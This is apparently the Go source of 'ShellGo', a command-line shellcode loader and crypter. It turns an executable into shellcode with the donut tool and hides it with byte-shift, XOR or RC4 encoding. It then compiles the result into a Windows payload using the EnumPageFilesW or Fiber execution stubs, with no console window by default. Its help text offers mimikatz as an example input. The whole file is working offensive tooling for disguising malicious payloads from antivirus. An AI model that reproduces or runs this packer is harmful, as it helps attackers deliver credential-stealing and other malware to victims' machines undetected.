package main

import (
	"ShellcodeLoader/help"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
)

type Args struct {
	Stub     []byte
	ArgsLine []string
	Terminal string
	Arch     string
	Len      int
	File     string
	Enc      string
	Key      string
	Output   string
}

func IsExist(filename string) bool {
	_, err := os.Stat(filename)
	return !os.IsNotExist(err)
}

func Exit(s any) {
	fmt.Printf("%s\n", s)
	os.Exit(1)
}

func (a Args) CheckLen(i int) string {
	if i+2 > a.Len {
		Exit(fmt.Sprintf("No value for argument %s", a.ArgsLine[i]))
	}
	return a.ArgsLine[i+1]
}

func (a *Args) ScanArgs() {
	if a.Len < 1 {
		Help()
	}
	for i := 0; i < a.Len; i++ {
		option := a.ArgsLine[i]
		switch option {
		case "-h", "--help", "h", "help":
			Help()

		case "--fullhelp", "-fullhelp", "-fh", "fh":
			FullHelp()

		case "-t", "--terminal":
			a.Terminal = ""

		case "-a", "--arch":
			op := a.CheckLen(i)
			switch strings.ToLower(op) {
			case "x86":
				switch runtime.GOOS {
				case "linux", "android", "ios", "darwin":
					a.Arch = "GOOS=windows GOARCH=386"
				case "windows":
					a.Arch = "$Env:GOARCH = \"386\";"
				}

			case "x64":
				switch runtime.GOOS {
				case "linux", "android", "ios", "darwin":
					a.Arch = "GOOS=windows GOARCH=amd64"
				}
				
			default:
				Exit("Argument arch invalid value")
			}
			i++

		case "-f", "--file":
			op := a.CheckLen(i)
			if !IsExist(op) {
				Exit(fmt.Sprintf("File: \"%s\" dont exist", op))
			}

			if filepath.Ext(op) != ".exe" && filepath.Ext(op) != ".bin" {
				Exit("ShellGo only encrypt files executables (.exe) and shellcode (.bin)")
			}
			a.File = op
			i++

		case "-o", "--output":
			op := a.CheckLen(i)
			if !strings.HasSuffix(op, ".exe") {
				op += ".exe"
			}
			a.Output = op
			i++

		case "-s", "--stub":
			op := a.CheckLen(i)
			switch strings.ToLower(op) {
			case "1":
				a.Stub = help.GoCode
			case "2":
				a.Stub = help.Fiber
			default:
				Exit(fmt.Sprintf("Stub option \"%s\" dont exist in ShellGo", op))
			}
			i++

		case "-e", "--encrypt":
			op := a.CheckLen(i)
			switch strings.ToLower(op) {
			case "1":
			case "2":
				a.Enc = "rc4"
			case "3":
				a.Enc = "xor"
			default:
				Exit(fmt.Sprintf("Encryption \"%s\" dont exist in ShellGo", op))
			}
			i++

		case "-k", "--key":
			op := a.CheckLen(i)
			a.Key = op
			i++

		default:
			Exit(fmt.Sprintf("Unknow argument: %s", option))
		}

	}

}

func NewArgs() Args {
	return Args{
		Stub:     help.GoCode,
		ArgsLine: os.Args[1:],
		Len:      len(os.Args[1:]),
		Output:   "PayloadShellGo.exe",
		Arch:     "$Env:GOARCH = \"amd64\";",
		Enc:      "default",
		Terminal: "-H=windowsgui",
	}
}

func (c Args) ConfigPayload() {
	CommandTerm := ""
	donut := ""
	switch runtime.GOOS {
	case "linux", "android", "ios", "darwin":
		CommandTerm = "sh"
		donut = "donut"
	case "windows":
		donut = "./donut.exe"
		CommandTerm = "powershell"
	}

	var shellcode []byte
	if filepath.Base(c.File) != ".bin" {
		if !IsExist("donut.exe") {
			Exit("Donut not found, download and copy in this folder")
		}

		cmd := exec.Command(
			CommandTerm,
			"-c",
			fmt.Sprintf("%s -z 4 -i %s", donut, c.File),
		)

		out, err := cmd.CombinedOutput()
		Error(string(out), err)

		shellcode, err = os.ReadFile("loader.bin")
		Error("Read shellcode", err)
		err = os.Remove("loader.bin")
		Error("Removing residous of shellcode", err)
	} else {
		var err error
		shellcode, err = os.ReadFile(c.File)
		Error("Read shellcode", err)
	}

	c.Encrypt(shellcode)

	_, err := exec.LookPath("go")
	Error("Need installed golang for compiled", err)

	compilacion := fmt.Sprintf(
		`%s go build -ldflags="%s -s -w" -o %s %s`,
		c.Arch,
		c.Terminal,
		c.Output,
		"pay.go",
	)

	out, err := exec.Command(CommandTerm,
		"-c",
		compilacion,
	).CombinedOutput()
	Error(string(out), err)

	err = os.Remove("pay.go")
	Error("Delete file.go", err)
}

func (c Args) Encrypt(shellcode []byte) {
	TemplateDec := []byte{}
	ShellcodeF := []byte{}
	var key []byte
	if c.Key == "" {
		key = make([]byte, 32)
		_, err := rand.Read(key)
		Error("Generating password", err)
		c.Key = string(FormatHex(key))[10:]
	} else {
		key = []byte(c.Key)
		c.Key = string(FormatHex([]byte(c.Key)))[10:]
	}

	switch c.Enc {
	case "default":
		N := make([]byte, 1)
		_, err := rand.Read(N)
		Error("read bytes", err)
		ShellcodeF = Obfuscate(shellcode, N[0])
		TemplateDec = bytes.Replace(help.Desofuscate, []byte("<<N>>"), []byte(strconv.Itoa(int(N[0]))), 1)

	case "xor":
		ShellcodeF = FormatHex(xor(shellcode, key))
		ShellcodeF = append(ShellcodeF, help.XorTemplate...)
		TemplateDec = []byte(fmt.Sprintf("buf = xor(buf, %s)", c.Key))

	case "rc4":
		c.Stub = bytes.Replace(c.Stub, []byte("<<Extra>>"), []byte("\"crypto/rc4\""), 1)
		ShellcodeF = FormatHex(Rc4(shellcode, key))
		ShellcodeF = append(ShellcodeF, help.Rc4Template...)
		TemplateDec = []byte(fmt.Sprintf("buf = dec(buf, %s)", c.Key))
	}

	c.Stub = bytes.Replace(c.Stub, []byte("<<Extra>>"), []byte(""), 1)
	c.Stub = bytes.Replace(c.Stub, []byte("<<ShellCode>>"), ShellcodeF, 1)
	c.Stub = bytes.Replace(c.Stub, []byte("<<Dec>>"), TemplateDec, 1)
	err := os.WriteFile("pay.go", c.Stub, 0644)
	Error("writing file", err)

}

func Rc4(shellcode, key []byte) []byte {
	c, err := rc4.NewCipher(key)
	if err != nil {
		panic(err)
	}
	dst := make([]byte, len(shellcode))
	c.XORKeyStream(dst, shellcode)
	return dst
}

func xor(input, key []byte) (output []byte) {
	output = make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ key[i%len(key)]
	}
	return output
}

func main() {
	config := NewArgs()
	config.ScanArgs()
	config.ConfigPayload()
}

func Obfuscate(s []byte, N byte) []byte {
	for i := range s {
		s[i] += N
	}

	return FormatHex(s)
}

func FormatHex(s []byte) []byte {
	str := hex.EncodeToString(s)
	var n uint = 0
	PayloadStr := []byte{118, 97, 114, 32, 98, 117, 102, 32, 61, 32, 91, 93, 98, 121, 116, 101, 40, 34, 34, 32, 43, 10, 34, 92, 120}
	var d uint = 0
	for _, i := range str {
		n++
		d++
		if d == 33 {
			PayloadStr = append(PayloadStr, []byte{34, 32, 43, 10, 34}...)
			d = 1
		}
		if n == 3 {
			PayloadStr = append(PayloadStr, []byte{92, 120}...)
			n = 1
		}
		PayloadStr = append(PayloadStr, []byte(string(i))...)
	}
	PayloadStr = append(PayloadStr, []byte{34, 44, 10, 41}...)
	return PayloadStr
}

func Error(inf string, err error) {
	if err != nil {
		fmt.Printf("Error %s: %s\n", inf, err)
		os.Exit(1)
	}
}

func Help() {
	s, _ := os.Executable()
	fmt.Printf(MenuHelp, filepath.Base(s))
	os.Exit(1)
}

func FullHelp() {
	s, _ := os.Executable()
	fmt.Printf(MenuFullHelp, filepath.Base(s))
	os.Exit(1)

}

var MenuHelp = `
[*] Usage ./%s -a x64 -f file.exe -o output.exe
[!] To see the complete help use --fullhelp or -fh
`

var MenuFullHelp = `
	[+] Help ShellGo [+] 

./%s -a x64 -f file.exe -o output.exe

Architecture to which the payload will be compiled
-a /--arch :	x86, x64 (default)

File to encrypt
-f / --file :

Add a preference of encryption
-e / --encrypt :  1-obfuscation (default), 2-rc4, 3-xor

Value of key to encrypt if use Rc4 or Xor by default is random
-k / --key :   example -k jksa89128as

Name of payload
-o / --out :    example --output test.exe

Build file with terminal, use only for tools whith CLI, example: mimikatz
-t / --terminal

Select stub
-s / --stub : 	1 -EnumPageFilesW (default), 2-Fiber
`
